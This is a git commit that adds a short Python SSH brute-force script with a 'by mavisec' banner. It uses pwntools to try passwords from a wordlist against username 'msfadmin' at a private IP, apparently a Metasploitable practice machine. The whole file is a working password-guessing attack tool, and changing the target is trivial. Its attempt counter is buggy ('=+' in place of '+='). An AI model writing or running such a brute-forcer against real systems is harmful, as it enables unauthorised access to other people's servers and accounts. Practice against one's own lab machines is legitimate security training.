22ee6fd2356d7156e4913e6f7097ad8fe7b1e248
Rishab Nayyar <82491413+mavisec@users.noreply.github.com>
2022-04-01 14:42:00 +0530

    Add files via upload

---
+++ ssh_bruteforcer.py
@@ -0,0 +1,33 @@
+from pwn import *
+import paramiko
+
+print("""
+  ___________         .__  .__    _________                     .__                         
+ /   _____/  | ____ __|  | |  |   \_   ___ \_______ __ __  _____|  |__   ___________  ______
+ \_____  \|  |/ /  |  \  | |  |   /    \  \/\_  __ \  |  \/  ___/  |  \_/ __ \_  __ \/  ___/
+ /        \    <|  |  /  |_|  |__ \     \____|  | \/  |  /\___ \|   Y  \  ___/|  | \/\___ \ 
+/_______  /__|_ \____/|____/____/  \______  /|__|  |____//____  >___|  /\___  >__|  /____  >
+        \/     \/                         \/                  \/     \/     \/           \/ 
+
+                                                                                   by mavisec
+        """)
+
+username = "msfadmin"
+host = "192.168.195.129"
+attempts = 0
+
+f = open('100.txt','r')
+
+for i in f:
+    i = i.strip("\n")
+    try:
+        print("[{}] Attempting password: {}".format(attempts, i))
+        response = ssh(user = username, host= host, password = i, timeout = Timeout.default )
+        if response.connected():
+            print(">> Valid Password: {}".format(i))
+            response.close()
+            break
+        response.close()
+    except Exception as e:
+        print(e)
+    attempts =+ 1
